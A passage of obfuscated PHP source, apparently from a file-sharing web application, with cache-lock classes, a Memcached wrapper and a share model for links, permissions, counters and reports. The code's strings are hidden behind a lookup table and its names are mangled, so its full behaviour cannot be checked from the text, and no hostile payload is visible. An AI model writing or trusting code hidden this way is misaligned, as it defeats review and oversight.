goto Cº¨¨ÆéÁò; dØâ¬»´Œ½: class CacheLockMemcached { public function lock($¢ûêáéî, $ù±ïû°¦ = 0) { $È”å«Œ = Cache::init(); $ˆÏÇÔŞ± = microtime(!0) + $ù±ïû°¦; while (microtime(!0) < $ˆÏÇÔŞ±) { $—ƒ•‘ş› = $È”å«Œ->get($¢ûêáéî); if (!$—ƒ•‘ş› || $—ƒ•‘ş› < microtime(!0)) { $¸×«¹é„ = $È”å«Œ->handle->add($¢ûêáéî, $ˆÏÇÔŞ±, $ù±ïû°¦); if ($¸×«¹é„) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ıéò¤«Œ) { return Cache::init()->get($ıéò¤«Œ); } public function unlock($À¯ìê˜‘) { return Cache::init()->remove($À¯ìê˜‘); } } class CacheLockDatabase { public function lock($°€è¥½´, $¨å»”¬¾ = 0) { $Â²¥¢÷À = Model($_SERVER[öæÛ¿©¿][929]); $§€ç = microtime(!0) + $¨å»”¬¾; while (microtime(!0) < $§€ç) { $Ç†ñê¹ = $Â²¥¢÷À->get($°€è¥½´); if (!$Ç†ñê¹ || $Ç†ñê¹ < microtime(!0)) { $²ôÆ‰³© = $Â²¥¢÷À->set($°€è¥½´, $§€ç); if ($²ôÆ‰³©) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($¢†°ä·) { return Model($_SERVER[öæÛ¿©¿][929])->get($¢†°ä·); } public function unlock($á”‹¼ç¬) { Model($_SERVER[öæÛ¿©¿][929])->remove($á”‹¼ç¬); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($¾è‰¾, $çşñâÌ³) { $•Ñïö =& $_SERVER[öæÛ¿©¿]; if (!class_exists($•Ñïö[971])) { show_json($•Ñïö[972], !1); } $this->cacheTime = $çşñâÌ³; $this->handle = new Memcached(); if (is_array($¾è‰¾[$•Ñïö[973]]) && count($¾è‰¾[$•Ñïö[973]]) >= 1) { foreach ($¾è‰¾[$•Ñïö[973]] as $ñÂ…“) { $šÄŞÍ’£ = explode($•Ñïö[4], $ñÂ…“); $this->handle->addServer($šÄŞÍ’£[0], $šÄŞÍ’£[1]); } } else { $this->handle->addServer($¾è‰¾[$•Ñïö[207]], $¾è‰¾[$•Ñïö[208]]); } } public function set($Úé÷ä×¶, $´—‹ÁàÚ, $™è°İ½¯ = false) { $™è°İ½¯ = $™è°İ½¯ ? $™è°İ½¯ : $this->cacheTime; return $this->handle->set($Úé÷ä×¶, $´—‹ÁàÚ, $™è°İ½¯); } public function get($½å´¹ôİ) { return $this->handle->get($½å´¹ôİ); } public function remove($–úÉõ‘í) { return $this->handle->delete($–úÉõ‘í); } public function deleteAll() { return $this->handle->flush(); } } goto eÀÓ¬ß·´; b¼›…ùÎÏ: class ShareModel extends ModelBase { protected $tableName = "\x73\x68\141\162\145"; protected $dataAuto = array(array("\x6d\157\x64\151\x66\171\124\151\155\145", "\x74\x69\155\145", "\x69\x6e\163\145\x72\164\x2c\x75\x70\144\141\164\x65", "\x66\x75\x6e\x63\164\151\157\156"), array("\x63\162\145\x61\x74\x65\124\151\155\x65", "\164\151\155\145", "\x69\x6e\163\145\x72\164", "\x66\x75\156\143\164\151\157\x6e"), array("\157\160\164\x69\157\156\x73", '', "\x69\156\163\145\162\x74\x2c\x75\160\x64\x61\x74\x65\x2c\x73\145\154\x65\x63\164", "\x6a\163\157\156")); private $fieldList = "\52"; protected function cacheFunctionAlias($âÆõĞ¦ù) { $òŒÜ˜üÄ =& $_SERVER[öæÛ¿©¿]; return array($òŒÜ˜üÄ[2270] => array(USER_ID, $òŒÜ˜üÄ[2271]), $òŒÜ˜üÄ[2272] => array($âÆõĞ¦ù[0], $òŒÜ˜üÄ[2273])); } protected function ___listSimple() { $ñáíèÚü = $this->field($this->fieldList)->where(array($_SERVER[öæÛ¿©¿][1538] => USER_ID))->select(); return $ñáíèÚü ? $ñáíèÚü : array(); } protected function ___getInfoShare($·¶ú‚ù) { return $this->_getShareInfo(array($_SERVER[öæÛ¿©¿][684] => $·¶ú‚ù), !1); } protected function getInfo($°ììõˆÌ) { $´¨¹“‡‰ = $this->getInfoShare($°ììõˆÌ); return $this->shareSourceInfo($´¨¹“‡‰); } public function getInfoByHash($³ƒË¾¹¸) { return $this->_getShareInfo(array($_SERVER[öæÛ¿©¿][1500] => $³ƒË¾¹¸)); } public function getInfoByPath($„š­‚Ù) { $ğ¹€üØ¦ =& $_SERVER[öæÛ¿©¿]; $Ó¥Á·€… = array($ğ¹€üØ¦[1538] => USER_ID, $ğ¹€üØ¦[192] => $„š­‚Ù); return $this->_getShareInfo($Ó¥Á·€…); } public function getInfoBySourcePath($ÕìÈ‘±è) { $ùÎ¸Î†– =& $_SERVER[öæÛ¿©¿]; $ï¸Ñ¾Ï = array($ùÎ¸Î†–[1538] => USER_ID, $ùÎ¸Î†–[579] => $ÕìÈ‘±è); return $this->_getShareInfo($ï¸Ñ¾Ï); } private function _getShareInfo($Úâ×·”â, $€Š»ßö´ = true) { $³û¾ÂÕ³ =& $_SERVER[öæÛ¿©¿]; $ˆ¯£ÌÌ” = $this->where($Úâ×·”â)->find(); if (!$ˆ¯£ÌÌ”) { return !1; } if (!is_array($ˆ¯£ÌÌ”[$³û¾ÂÕ³[576]])) { $ˆ¯£ÌÌ”[$³û¾ÂÕ³[576]] = array(); } $Úâ×·”â = array($³û¾ÂÕ³[684] => $ˆ¯£ÌÌ”[$³û¾ÂÕ³[684]]); $ƒäã¸óÍ = $³û¾ÂÕ³[2274]; $ˆ¯£ÌÌ”[$³û¾ÂÕ³[1496]] = Model($³û¾ÂÕ³[685])->order($³û¾ÂÕ³[483])->field($ƒäã¸óÍ)->where($Úâ×·”â)->select(); if (!$€Š»ßö´) { return $ˆ¯£ÌÌ”; } return $this->shareSourceInfo($ˆ¯£ÌÌ”); } private function shareSourceInfo($ØøÂ•ì) { $Ó¦³ãõÌ =& $_SERVER[öæÛ¿©¿]; if (!is_array($ØøÂ•ì)) { return $ØøÂ•ì; } if ($ØøÂ•ì[$Ó¦³ãõÌ[192]] == $Ó¦³ãõÌ[229]) { $ØøÂ•ì[$Ó¦³ãõÌ[90]] = IO::info($ØøÂ•ì[$Ó¦³ãõÌ[579]]); } else { $ØøÂ•ì[$Ó¦³ãõÌ[90]] = Model($Ó¦³ãõÌ[1478])->pathInfo($ØøÂ•ì[$Ó¦³ãõÌ[192]]); } return $ØøÂ•ì; } protected function getInfoAuth($Ô÷íêùÊ) { $ÉÁØ ¾Ô =& $_SERVER[öæÛ¿©¿]; $Š¸õ®¼ = $this->getInfo($Ô÷íêùÊ); if ($Š¸õ®¼[$ÉÁØ ¾Ô[1538]] == USER_ID) { $Š¸õ®¼[$ÉÁØ ¾Ô[498]] = $Š¸õ®¼[$ÉÁØ ¾Ô[90]][$ÉÁØ ¾Ô[498]]; } else { $Š¸õ®¼[$ÉÁØ ¾Ô[498]] = Model($ÉÁØ ¾Ô[583])->authMake($Š¸õ®¼[$ÉÁØ ¾Ô[1496]]); } return $Š¸õ®¼; } protected function listData($¤îçÌù§ = null, $šòÎ®¤½ = 300) { $¬š‘½º =& $_SERVER[öæÛ¿©¿]; $ğÜÔ³â­ = array(array($¬š‘½º[574] => array($¬š‘½º[1124], 0), $¬š‘½º[682] => array($¬š‘½º[1124], 0), $¬š‘½º[2275] => $¬š‘½º[2231])); if ($¤îçÌù§ == $¬š‘½º[2276]) { $ğÜÔ³â­ = array($¬š‘½º[574] => 1); } else { if ($¤îçÌù§ == $¬š‘½º[1289]) { $ğÜÔ³â­ = array($¬š‘½º[682] => 1); } } $ğÜÔ³â­[$¬š‘½º[1538]] = USER_ID; $‹„êç¬³ = $this->where($ğÜÔ³â­)->selectPage($šòÎ®¤½); return $‹„êç¬³; } protected function listToMe($€¾¹‰£š = 300) { $ª¾…ÍØÄ =& $_SERVER[öæÛ¿©¿]; $¢ˆºË” = Model($ª¾…ÍØÄ[2277])->userGroupParents(USER_ID); $Õõ“›¿ = array($ª¾…ÍØÄ[667] => SourceModel::TYPE_USER, $ª¾…ÍØÄ[585] => USER_ID); if ($¢ˆºË”) { $Õõ“›¿ = array(array($ª¾…ÍØÄ[667] => SourceModel::TYPE_USER, $ª¾…ÍØÄ[585] => USER_ID), array($ª¾…ÍØÄ[667] => SourceModel::TYPE_GROUP, $ª¾…ÍØÄ[585] => array($ª¾…ÍØÄ[7], $¢ˆºË”)), $ª¾…ÍØÄ[2275] => $ª¾…ÍØÄ[2231]); } $µÊÕ›‚À = Model($ª¾…ÍØÄ[685])->where($Õõ“›¿)->selectPage($€¾¹‰£š); $î›æ£¸¼ = array_to_keyvalue_group($µÊÕ›‚À[$ª¾…ÍØÄ[446]], $ª¾…ÍØÄ[684]); if (!$î›æ£¸¼) { return $µÊÕ›‚À; } $æâÚÆÉÇ = $ª¾…ÍØÄ[2278]; $Õõ“›¿ = array($ª¾…ÍØÄ[684] => array($ª¾…ÍØÄ[503], array_keys($î›æ£¸¼))); $§¥À‡¡™ = $this->field($æâÚÆÉÇ)->where($Õõ“›¿)->select(); foreach ($§¥À‡¡™ as $Àµ˜ôßú => &$–÷ªĞÏÍ) { $–÷ªĞÏÍ[$ª¾…ÍØÄ[1496]] = $î›æ£¸¼[$–÷ªĞÏÍ[$ª¾…ÍØÄ[684]]]; } unset($–÷ªĞÏÍ); $¸Ù³´»— = array($ª¾…ÍØÄ[2279] => $§¥À‡¡™, $ª¾…ÍØÄ[2280] => $µÊÕ›‚À[$ª¾…ÍØÄ[443]]); return $¸Ù³´»—; } protected function shareAdd($ÅÜŸÅÌÉ, $Ë¥ìÀÒÍ) { $¸Š·ŸÙá =& $_SERVER[öæÛ¿©¿]; $«ˆ¸Áè  = $this->_addShareData($ÅÜŸÅÌÉ, $Ë¥ìÀÒÍ); if (!empty($Ë¥ìÀÒÍ[$¸Š·ŸÙá[2281]])) { $this->_shareAuthSet($«ˆ¸Áè , $Ë¥ìÀÒÍ[$¸Š·ŸÙá[2281]]); } $this->shareEventAdd($ÅÜŸÅÌÉ, $Ë¥ìÀÒÍ, $¸Š·ŸÙá[2282]); return $«ˆ¸Áè ; } protected function shareAddSystem($ãñ‡ŸÌ, $ˆÆƒŞ­—) { $Àò™åÒù =& $_SERVER[öæÛ¿©¿]; $ÏŞšÍŒ› = $this->_addShareData($ãñ‡ŸÌ, $ˆÆƒŞ­—, $Àò™åÒù[190]); $this->_shareAuthSet($ÏŞšÍŒ›, $ˆÆƒŞ­—[$Àò™åÒù[2281]]); return $ÏŞšÍŒ›; } private function shareEventAdd($ãŞ—Áö‹, $üÂíÃĞÉ, $ÙœØ…ÇÇ = "\141\144\x64") { $¡ûşªÕÆ =& $_SERVER[öæÛ¿©¿]; if (!$ãŞ—Áö‹ || $ãŞ—Áö‹ == $¡ûşªÕÆ[229]) { return; } if ($ÙœØ…ÇÇ == $¡ûşªÕÆ[2282]) { if ($üÂíÃĞÉ[$¡ûşªÕÆ[574]] == $¡ûşªÕÆ[91]) { Model($¡ûşªÕÆ[652])->eventShare($ãŞ—Áö‹, $¡ûşªÕÆ[2283]); } if ($üÂíÃĞÉ[$¡ûşªÕÆ[682]] == $¡ûşªÕÆ[91]) { Model($¡ûşªÕÆ[652])->eventShare($ãŞ—Áö‹, $¡ûşªÕÆ[2284]); } return; } $²Àï‘Á¤ = $this->getInfoByPath($ãŞ—Áö‹); $Ñ³°Î²… = $¡ûşªÕÆ[2285]; if ($²Àï‘Á¤[$¡ûşªÕÆ[574]] == $¡ûşªÕÆ[229] && $üÂíÃĞÉ[$¡ûşªÕÆ[574]] == $¡ûşªÕÆ[91]) { $Ñ³°Î²… = $¡ûşªÕÆ[2283]; } if ($²Àï‘Á¤[$¡ûşªÕÆ[574]] == $¡ûşªÕÆ[91] && $üÂíÃĞÉ[$¡ûşªÕÆ[574]] == $¡ûşªÕÆ[229]) { $Ñ³°Î²… = $¡ûşªÕÆ[2286]; } if ($²Àï‘Á¤[$¡ûşªÕÆ[682]] == $¡ûşªÕÆ[229] && $üÂíÃĞÉ[$¡ûşªÕÆ[682]] == $¡ûşªÕÆ[91]) { $Ñ³°Î²… = $¡ûşªÕÆ[2284]; } if ($²Àï‘Á¤[$¡ûşªÕÆ[682]] == $¡ûşªÕÆ[91] && $üÂíÃĞÉ[$¡ûşªÕÆ[682]] == $¡ûşªÕÆ[229]) { $Ñ³°Î²… = $¡ûşªÕÆ[2287]; } Model($¡ûşªÕÆ[652])->eventShare($ãŞ—Áö‹, $Ñ³°Î²…); return; } private function _addShareData($“·¹ë¼, $ıá˜·Å™ = array(), $îë²¨÷Ñ = false) { $û‘ï¢äï =& $_SERVER[öæÛ¿©¿]; $ÓÂ¬§» = $îë²¨÷Ñ == $û‘ï¢äï[190] ? 0 : USER_ID; $¶ŒßÅÂ = array($û‘ï¢äï[502] => $“·¹ë¼, $û‘ï¢äï[1916] => $ÓÂ¬§»); if ($“·¹ë¼ == 0) { $¶ŒßÅÂ = array($û‘ï¢äï[2288] => $ıá˜·Å™[$û‘ï¢äï[579]], $û‘ï¢äï[1916] => $ÓÂ¬§»); } if ($ìƒœîğ£ = $this->where($¶ŒßÅÂ)->find()) { return $ìƒœîğ£[$û‘ï¢äï[684]]; } if ($“·¹ë¼ == 0) { $åşğ¸äş = array($û‘ï¢äï[32] => get_path_this($ıá˜·Å™[$û‘ï¢äï[87]])); } else { $åşğ¸äş = Model($û‘ï¢äï[925])->sourceInfo($“·¹ë¼); if (!$åşğ¸äş) { return !1; } } if (!$ıá˜·Å™[$û‘ï¢äï[1813]]) { $ıá˜·Å™[$û‘ï¢äï[1813]] = $åşğ¸äş[$û‘ï¢äï[32]]; } $‡É¹É£” = array($û‘ï¢äï[1916] => $ÓÂ¬§», $û‘ï¢äï[502] => $“·¹ë¼, $û‘ï¢äï[1813] => $û‘ï¢äï[12], $û‘ï¢äï[574] => 0, $û‘ï¢äï[682] => 0, $û‘ï¢äï[579] => $û‘ï¢äï[12], $û‘ï¢äï[383] => $û‘ï¢äï[12], $û‘ï¢äï[998] => $û‘ï¢äï[12], $û‘ï¢äï[2289] => 0, $û‘ï¢äï[2290] => 0, $û‘ï¢äï[854] => 0, $û‘ï¢äï[576] => $û‘ï¢äï[12], $û‘ï¢äï[1500] => $û‘ï¢äï[12]); $ïˆİ•’Ù = explode($û‘ï¢äï[50], $û‘ï¢äï[2291]); foreach ($ïˆİ•’Ù as $«ê”ù¾Ô) { if (!isset($ıá˜·Å™[$«ê”ù¾Ô])) { continue; } $‡É¹É£”[$«ê”ù¾Ô] = $ıá˜·Å™[$«ê”ù¾Ô]; } $â‚ìè ß = $this->add($‡É¹É£”); $…„á‚¯® = array($û‘ï¢äï[1500] => short_id($â‚ìè ß)); if ($this->where($…„á‚¯®)->find()) { $…„á‚¯®[$û‘ï¢äï[1500]] .= $û‘ï¢äï[473] . rand_string(2, 3); } $this->where(array($û‘ï¢äï[2292] => $â‚ìè ß))->save($…„á‚¯®); return $â‚ìè ß; } private function _shareAuthSet($•èûúè×, $ì–©Å¦¢) { $ãÖú«ƒ =& $_SERVER[öæÛ¿©¿]; if (!is_array($ì–©Å¦¢)) { return !1; } $®Ğ†“ò = Model($ãÖú«ƒ[2240]); $®Ğ†“ò->where(array($ãÖú«ƒ[684] => $•èûúè×))->delete(); $Ôª¹„€Î = array(); foreach ($ì–©Å¦¢ as $á‡•Ïã›) { $Â€ø»³ = SourceModel::TYPE_USER; if ($á‡•Ïã›[$ãÖú«ƒ[189]] == SourceModel::TYPE_GROUP) { $Â€ø»³ = SourceModel::TYPE_GROUP; } $¡˜–çğ» = array($ãÖú«ƒ[684] => $•èûúè×, $ãÖú«ƒ[189] => $Â€ø»³, $ãÖú«ƒ[585] => intval($á‡•Ïã›[$ãÖú«ƒ[585]]), $ãÖú«ƒ[1585] => 0, $ãÖú«ƒ[2293] => -1); if ($á‡•Ïã›[$ãÖú«ƒ[1585]]) { $¡˜–çğ»[$ãÖú«ƒ[1585]] = $á‡•Ïã›[$ãÖú«ƒ[1585]]; } else { if ($á‡•Ïã›[$ãÖú«ƒ[2293]]) { $¡˜–çğ»[$ãÖú«ƒ[2293]] = $á‡•Ïã›[$ãÖú«ƒ[2293]]; } } $Ôª¹„€Î[] = $¡˜–çğ»; } return $®Ğ†“ò->addAll($Ôª¹„€Î, array(), !0); } public function numViewAdd($—Ñù“Ÿ) { $—’‰£Ë =& $_SERVER[öæÛ¿©¿]; $ÇÖ÷šö = array($—’‰£Ë[2292] => $—Ñù“Ÿ); $this->where($ÇÖ÷šö)->setAdd($—’‰£Ë[2289]); } public function numDownloadAdd($Ã½û‹â) { $–ÏÈ“¾Ï =& $_SERVER[öæÛ¿©¿]; $æ ë°± = array($–ÏÈ“¾Ï[2292] => $Ã½û‹â); $this->where($æ ë°±)->setAdd($–ÏÈ“¾Ï[2290]); } protected function shareEdit($¿ˆä¬Û, $ìÈÛ˜Ê·) { $ÓÄ”ğ“µ =& $_SERVER[öæÛ¿©¿]; $óúè·¢‡ = $this->getInfo($¿ˆä¬Û); if (!$óúè·¢‡) { return !1; } if ($ìÈÛ˜Ê·[$ÓÄ”ğ“µ[1500]] && $ìÈÛ˜Ê·[$ÓÄ”ğ“µ[574]] == $ÓÄ”ğ“µ[91]) { if ($ìÈÛ˜Ê·[$ÓÄ”ğ“µ[1500]] == $óúè·¢‡[$ÓÄ”ğ“µ[1500]]) { unset($ìÈÛ˜Ê·[$ÓÄ”ğ“µ[1500]]); } if ($ìÈÛ˜Ê·[$ÓÄ”ğ“µ[1500]]) { $ˆ…øŒ˜Ø = $this->where(array($ÓÄ”ğ“µ[2294] => $ìÈÛ˜Ê·[$ÓÄ”ğ“µ[1500]]))->find(); if ($ˆ…øŒ˜Ø) { return !1; } if (!is_array($ìÈÛ˜Ê·[$ÓÄ”ğ“µ[576]])) { $ìÈÛ˜Ê·[$ÓÄ”ğ“µ[576]] = is_array($óúè·¢‡[$ÓÄ”ğ“µ[576]]) ? $óúè·¢‡[$ÓÄ”ğ“µ[576]] : array(); } if (!$ìÈÛ˜Ê·[$ÓÄ”ğ“µ[576]][$ÓÄ”ğ“µ[2295]]) { $ìÈÛ˜Ê·[$ÓÄ”ğ“µ[576]][$ÓÄ”ğ“µ[2295]] = $óúè·¢‡[$ÓÄ”ğ“µ[1500]]; $ìÈÛ˜Ê·[$ÓÄ”ğ“µ[576]][$ÓÄ”ğ“µ[2296]] = $ÓÄ”ğ“µ[91]; } } } $this->_checkLinkShare($ìÈÛ˜Ê·, $óúè·¢‡); $“©¨ÏÆ = array(); $›Éö±›€ = explode($ÓÄ”ğ“µ[50], $ÓÄ”ğ“µ[2297]); foreach ($›Éö±›€ as $Şä“ÍóÒ) { if (!array_key_exists($Şä“ÍóÒ, $ìÈÛ˜Ê·)) { continue; } $“©¨ÏÆ[$Şä“ÍóÒ] = $ìÈÛ˜Ê·[$Şä“ÍóÒ]; } $this->shareEventAdd($óúè·¢‡[$ÓÄ”ğ“µ[192]], $ìÈÛ˜Ê·, $ÓÄ”ğ“µ[1507]); $this->where(array($ÓÄ”ğ“µ[2292] => $¿ˆä¬Û))->save($“©¨ÏÆ); if (isset($ìÈÛ˜Ê·[$ÓÄ”ğ“µ[2281]])) { $this->_shareAuthSet($¿ˆä¬Û, $ìÈÛ˜Ê·[$ÓÄ”ğ“µ[2281]]); } return !0; } private function _checkLinkShare($Êû™ÇÀè, $–à«õãı) { $¦¢Î¹©Ú =& $_SERVER[öæÛ¿©¿]; if ($Êû™ÇÀè[$¦¢Î¹©Ú[574]] != $¦¢Î¹©Ú[91]) { return; } $ÖÆ­œ– = $–à«õãı[$¦¢Î¹©Ú[90]][$¦¢Î¹©Ú[192]]; if ($–à«õãı[$¦¢Î¹©Ú[90]][$¦¢Î¹©Ú[33]] != $¦¢Î¹©Ú[231]) { $ÃŸÌ”Ë… = $this->_folderReport($ÖÆ­œ–); if (!$ÃŸÌ”Ë…) { return; } show_json(LNG($¦¢Î¹©Ú[2298]) . $¦¢Î¹©Ú[2299] . $ÃŸÌ”Ë…, !1); } $ÏŞ‡²ÙÒ = Model($¦¢Î¹©Ú[925])->fileInfoGet($–à«õãı[$¦¢Î¹©Ú[90]][$¦¢Î¹©Ú[192]]); if (!$ÏŞ‡²ÙÒ) { return; } $¸´”ú‹Ç = $this->shareFileMeta($ÏŞ‡²ÙÒ[$¦¢Î¹©Ú[553]]); if (isset($¸´”ú‹Ç[$¦¢Î¹©Ú[451]]) && $¸´”ú‹Ç[$¦¢Î¹©Ú[451]] == $¦¢Î¹©Ú[91]) { show_json(LNG($¦¢Î¹©Ú[2300]), !1); } } private function _folderReport($Ù·ø¶¬) { $Íøôé™‹ =& $_SERVER[öæÛ¿©¿]; $¹ùÅØû® = array($Íøôé™‹[553] => array($Íøôé™‹[1124], 0), $Íøôé™‹[842] => 3); $¬‰²½ùª = Model($Íøôé™‹[2301])->where($¹ùÅØû®)->field($Íøôé™‹[553])->select(); if (!$¬‰²½ùª) { return !1; } $¬‰²½ùª = array_to_keyvalue($¬‰²½ùª, $Íøôé™‹[12], $Íøôé™‹[553]); $ß…ÊÆ¦ô = $Íøôé™‹[50] . $Ù·ø¶¬ . $Íøôé™‹[50]; $¹ùÅØû® = array($Íøôé™‹[553] => array($Íøôé™‹[7], $¬‰²½ùª), $Íøôé™‹[600] => array($Íøôé™‹[470], "\x25{$ß…ÊÆ¦ô}\x25"), $Íøôé™‹[516] => 0); $ÚÎŒÍƒ¸ = Model($Íøôé™‹[925])->where($¹ùÅØû®)->field($Íøôé™‹[2302])->find(); if (!$ÚÎŒÍƒ¸) { return !1; } $íÀ³¢Ì§ = substr($ÚÎŒÍƒ¸[$Íøôé™‹[600]], strpos($ÚÎŒÍƒ¸[$Íøôé™‹[600]], $ß…ÊÆ¦ô)); $¹ùÅØû® = array($Íøôé™‹[192] => array($Íøôé™‹[7], trim($íÀ³¢Ì§, $Íøôé™‹[50]))); $ôôÆİŠ = Model($Íøôé™‹[925])->where($¹ùÅØû®)->field($Íøôé™‹[32])->select(); $²ëíğö = array_to_keyvalue($ôôÆİŠ, $Íøôé™‹[12], $Íøôé™‹[32]); $²ëíğö[] = $ÚÎŒÍƒ¸[$Íøôé™‹[32]]; return implode($Íøôé™‹[8], $²ëíğö); } protected function remove($š©‹ÔÅ) { $¥¼ş¡íÃ =& $_SERVER[öæÛ¿©¿]; $Â£­·ÇÌ = is_array($š©‹ÔÅ) ? $š©‹ÔÅ : array($š©‹ÔÅ); for ($‰µüÁÄÆ = 0; $‰µüÁÄÆ < count($Â£­·ÇÌ); $‰µüÁÄÆ++) { $Èî¨ÌÅ = $this->getInfo($Â£­·ÇÌ[$‰µüÁÄÆ]); if ($Èî¨ÌÅ[$¥¼ş¡íÃ[682]] == $¥¼ş¡íÃ[91]) { Model($¥¼ş¡íÃ[652])->eventShare($Èî¨ÌÅ[$¥¼ş¡íÃ[192]], $¥¼ş¡íÃ[2287]); } if ($Èî¨ÌÅ[$¥¼ş¡íÃ[574]] == $¥¼ş¡íÃ[91]) { Model($¥¼ş¡íÃ[652])->eventShare($Èî¨ÌÅ[$¥¼ş¡íÃ[192]], $¥¼ş¡íÃ[2286]); } } $ğÏó®Ô = array($¥¼ş¡íÃ[684] => array($¥¼ş¡íÃ[7], $Â£­·ÇÌ)); $¬€¶¶ = $this->where($ğÏó®Ô)->delete(); if ($¬€¶¶) { Model($¥¼ş¡íÃ[685])->where($ğÏó®Ô)->delete(); } return $¬€¶¶; } protected function removeBySource($à¥Ñ°) { $‚¾­™ =& $_SERVER[öæÛ¿©¿]; $úÜ”û©Ş = array($‚¾­™[502] => array($‚¾­™[503], $à¥Ñ°)); $çİ§ã»­ = $this->field($‚¾­™[684])->where($úÜ”û©Ş)->select(); $­·“ò = array_to_keyvalue($çİ§ã»­, $‚¾­™[12], $‚¾­™[684]); if (!$­·“ò) { return; } foreach ($çİ§ã»­ as $èŠ÷åÉ¾) { $this->shareInfoMofify($èŠ÷åÉ¾, $‚¾­™[2303]); } $úÜ”û©Ş = array($‚¾­™[2292] => array($‚¾­™[503], $­·“ò)); $this->where($úÜ”û©Ş)->delete(); Model($‚¾­™[685])->where($úÜ”û©Ş)->delete(); } public function listAll($™«Æë«ï) { $õ”ùš”Ğ =& $_SERVER[öæÛ¿©¿]; $Şş·Ù¾— = array(); if ($™«Æë«ï[$õ”ùš”Ğ[1538]]) { $Şş·Ù¾—[$õ”ùš”Ğ[1538]] = $™«Æë«ï[$õ”ùš”Ğ[1538]]; } if ($™«Æë«ï[$õ”ùš”Ğ[853]]) { $ø´¢§œŸ = $™«Æë«ï[$õ”ùš”Ğ[854]] ? $™«Æë«ï[$õ”ùš”Ğ[854]] : strtotime(date($õ”ùš”Ğ[2304])); $Şş·Ù¾—[$õ”ùš”Ğ[232]] = array($õ”ùš”Ğ[409], array($™«Æë«ï[$õ”ùš”Ğ[853]], $ø´¢§œŸ)); } if ($™«Æë«ï[$õ”ùš”Ğ[33]]) { $Şş·Ù¾—[$™«Æë«ï[$õ”ùš”Ğ[33]]] = 1; } else { $Şş·Ù¾—[] = array($õ”ùš”Ğ[574] => array($õ”ùš”Ğ[1124], 0), $õ”ùš”Ğ[682] => array($õ”ùš”Ğ[1124], 0), $õ”ùš”Ğ[2275] => $õ”ùš”Ğ[2231]); } if ($™«Æë«ï[$õ”ùš”Ğ[2227]]) { $Şş·Ù¾—[] = array($õ”ùš”Ğ[1500] => $™«Æë«ï[$õ”ùš”Ğ[2227]], $õ”ùš”Ğ[1813] => array($õ”ùš”Ğ[470], "\45{$™«Æë«ï[$õ”ùš”Ğ[2227]]}\45"), $õ”ùš”Ğ[2275] => $õ”ùš”Ğ[2231]); } $¹ş‡ëã = $this->_makeOrder()->where($Şş·Ù¾—)->selectPage(20); if (empty($¹ş‡ëã[$õ”ùš”Ğ[446]])) { return array(); } $this->_listDataApply($¹ş‡ëã[$õ”ùš”Ğ[446]]); return $¹ş‡ëã; } public function listDataApply($·ïíŞÚÕ) { $this->_listDataApply($·ïíŞÚÕ); return $·ïíŞÚÕ; } private function _listDataApply(&$–¹ı°) { $ªÜªİûó =& $_SERVER[öæÛ¿©¿]; $øÜèÚ­µ = array_to_keyvalue($–¹ı°, $ªÜªİûó[12], $ªÜªİûó[1538]); $¹à”…ªÄ = Model($ªÜªİûó[613])->userListInfo(array_unique($øÜèÚ­µ)); $ô‘¨¸ˆ  = array_to_keyvalue($–¹ı°, $ªÜªİûó[12], $ªÜªİûó[192]); $°•ÕáÎË = Model($ªÜªİûó[925])->sourceListInfo($ô‘¨¸ˆ , !0); foreach ($–¹ı° as $¡¬°Ş‚œ => &$³ô¬ÃÂ—) { $ÈŒ³Œ† = $³ô¬ÃÂ—[$ªÜªİûó[1538]]; $³ô¬ÃÂ—[$ªÜªİûó[2305]] = $¹à”…ªÄ[$ÈŒ³Œ†] ? $¹à”…ªÄ[$ÈŒ³Œ†] : !1; if (!$³ô¬ÃÂ—[$ªÜªİûó[2305]] || $³ô¬ÃÂ—[$ªÜªİûó[2305]][$ªÜªİûó[842]] != $ªÜªİûó[91]) { unset($–¹ı°[$¡¬°Ş‚œ]); continue; } $Ãšğ£Ò° = $³ô¬ÃÂ—[$ªÜªİûó[192]]; $³ô¬ÃÂ—[$ªÜªİûó[90]] = $°•ÕáÎË[$Ãšğ£Ò°] ? $°•ÕáÎË[$Ãšğ£Ò°] : !1; if ($³ô¬ÃÂ—[$ªÜªİûó[90]][$ªÜªİûó[516]] == $ªÜªİûó[91]) { unset($–¹ı°[$¡¬°Ş‚œ]); } if ($³ô¬ÃÂ—[$ªÜªİûó[90]] != $ªÜªİûó[229] && !$³ô¬ÃÂ—[$ªÜªİûó[90]]) { unset($–¹ı°[$¡¬°Ş‚œ]); } } unset($³ô¬ÃÂ—); $–¹ı° = array_values($–¹ı°); } private function _makeOrder($éºéôõ‘ = '') { $—£ò¥è =& $_SERVER[öæÛ¿©¿]; $—¾ÕáşÀ = array($—£ò¥è[232], $—£ò¥è[854], $—£ò¥è[2289], $—£ò¥è[2290]); $ ´—¨Ì¨ = array($—£ò¥è[533] => $—£ò¥è[534], $—£ò¥è[535] => $—£ò¥è[536]); $®Ğ¥ú®¦ = Input::get($—£ò¥è[540], $—£ò¥è[7], $—£ò¥è[508], $—¾ÕáşÀ); $·Şø®Ûª = Input::get($—£ò¥è[541], $—£ò¥è[7], $—£ò¥è[2306], array($—£ò¥è[2224], $—£ò¥è[535])); $·Şø®Ûª = $ ´—¨Ì¨[$·Şø®Ûª]; $éºéôõ‘ = $éºéôõ‘ . "{$®Ğ¥ú®¦}\x20{$·Şø®Ûª}"; return $this->order($éºéôõ‘); } public function reportAdd($õŸù°“©) { $®„Ä›Ç =& $_SERVER[öæÛ¿©¿]; $õ¸»‰ú = array($®„Ä›Ç[684] => $õŸù°“©[$®„Ä›Ç[684]], $®„Ä›Ç[1538] => USER_ID); if (Model($®„Ä›Ç[2301])->where($õ¸»‰ú)->find()) { return !1; } $Ÿ›°ì¬ = array($®„Ä›Ç[684] => $õŸù°“©[$®„Ä›Ç[684]], $®„Ä›Ç[1813] => $õŸù°“©[$®„Ä›Ç[1813]], $®„Ä›Ç[192] => $õŸù°“©[$®„Ä›Ç[192]], $®„Ä›Ç[553] => $õŸù°“©[$®„Ä›Ç[553]], $®„Ä›Ç[1538] => USER_ID, $®„Ä›Ç[33] => $õŸù°“©[$®„Ä›Ç[33]], $®„Ä›Ç[536] => $õŸù°“©[$®„Ä›Ç[536]]); return Model($®„Ä›Ç[2301])->add($Ÿ›°ì¬); } public function reportList($ğÅ•Ó) { $¢îÒèÃñ =& $_SERVER[öæÛ¿©¿]; $ãÈ¢ÅÃ¶ = array(); if ($ğÅ•Ó[$¢îÒèÃñ[853]]) { 